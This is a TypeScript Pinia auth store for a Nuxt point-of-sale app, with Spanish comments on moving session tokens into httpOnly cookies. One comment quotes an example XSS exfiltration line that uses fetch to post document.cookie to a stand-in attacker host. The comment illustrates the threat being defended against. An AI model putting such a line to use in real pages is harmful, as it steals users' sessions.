import { defineStore } from 'pinia'
import { ref, computed } from 'vue'
import { useCookie, useNuxtApp } from '#app'
import type { User, UserPermissions, ApiResponse, LoginData, MeData } from '~/types/auth'

/**
 * Marca LEGIBLE que indica "hay una sesión abierta". La emite el backend.
 *
 * No es una credencial: su valor es `1`. Existe sólo para que el middleware de
 * rutas pueda decidir de forma SÍNCRONA si pinta la aplicación o manda al login.
 * Sin ella habría que consultar `/auth/me` en cada navegación, y en un punto de
 * venta eso es una ida y vuelta al servidor por cada clic del cajero.
 */
const MARCA_DE_SESION = 'session_active'

export const useAuthStore = defineStore('auth', () => {
  // === ESTADO ===
  const user = ref<User | null>(null)
  const permissions = ref<UserPermissions>({} as UserPermissions)

  // ─────────────────────────────────────────────────────────────────────
  // AQUÍ YA NO HAY TOKENS.
  //
  // Hasta la Fase 4 este store guardaba `access_token` y `refresh_token` en
  // cookies escritas desde JavaScript. Eso significa que cualquier XSS podía
  // hacer `fetch('https://atacante/', { body: document.cookie })` y llevarse la
  // sesión completa de un gerente: cobrar, anular ventas, ver el libro de
  // controlados. El usuario legítimo no notaba nada.
  //
  // Ahora las emite el backend como `httpOnly`: el navegador las guarda y las
  // adjunta él mismo, pero ningún script puede leerlas. El front sólo ve esta
  // marca, que no concede acceso a nada.
  // ─────────────────────────────────────────────────────────────────────
  const sesionActiva = useCookie<string | null>(MARCA_DE_SESION)

  // === GETTERS ===
  const isAuthenticated = computed(() => !!sesionActiva.value)
  const can = computed(() => (permission: string) => !!permissions.value[permission])
  const isAdmin = computed(() => user.value?.role === 'ADMIN')

  // === ACCIONES ===
  async function login(credentials: { email: string; password: string; rememberMe?: boolean }) {
    const { $api } = useNuxtApp()

    // La respuesta ya NO trae tokens: si los trajera, JavaScript podría leerlos
    // del cuerpo y guardarlos donde un XSS los alcanzara, que es exactamente lo
    // que las cookies httpOnly vienen a impedir. Llegan en cabeceras `Set-Cookie`
    // que el navegador procesa sin que el código las vea.
    const res = await $api<ApiResponse<LoginData>>('/auth/login', {
      method: 'POST',
      body: credentials,
    })

    // La marca la escribió el backend en la misma respuesta. Se refresca el ref
    // para que `isAuthenticated` reaccione sin esperar a la siguiente
    // navegación: el usuario pulsa "Entrar" y la interfaz cambia en el acto.
    sesionActiva.value = '1'

    user.value = res.data.user ?? null

    // Perfil completo (incluye la matriz de permisos). Ya no hace falta pasarle
    // ningún token: la cookie viaja sola.
    await fetchProfile()

    return res
  }

  async function fetchProfile() {
    const { $api } = useNuxtApp()
    try {
      const res = await $api<ApiResponse<MeData>>('/auth/me')
      user.value = res.data.user
      permissions.value = res.data.permissions
    } catch {
      // Un 401 aquí significa que ni el access ni el refresh sirven: el plugin
      // ya intentó renovar antes de dejar caer el error.
      clearSession()
    }
  }

  async function logout() {
    const { $api } = useNuxtApp()
    try {
      // Sin cuerpo: el refresh token va en la cookie y el backend lo lee de ahí.
      // Es él quien revoca la fila y borra las tres cookies.
      await $api('/auth/logout', { method: 'POST', body: {} })
    } catch (error) {
      // Aunque falle la revocación en el servidor, limpiamos en local: "cerrar
      // sesión" no puede dejar al usuario dentro.
      console.error('Error al cerrar sesión', error)
    } finally {
      clearSession()
    }
  }

  /**
   * Limpia el estado local.
   *
   * Sólo puede borrar la MARCA: las cookies de sesión son httpOnly y JavaScript
   * no las alcanza. Quien las borra de verdad es el backend, en `/auth/logout`.
   * Si sólo se limpia aquí (por ejemplo tras un 401 irrecuperable), las cookies
   * caducan solas y, mientras tanto, no conceden nada porque el token que
   * contienen ya no es válido.
   */
  function clearSession() {
    user.value = null
    permissions.value = {} as UserPermissions
    sesionActiva.value = null
  }

  return {
    user,
    permissions,
    sesionActiva,
    isAuthenticated,
    can,
    isAdmin,
    login,
    logout,
    fetchProfile,
    clearSession,
  }
})
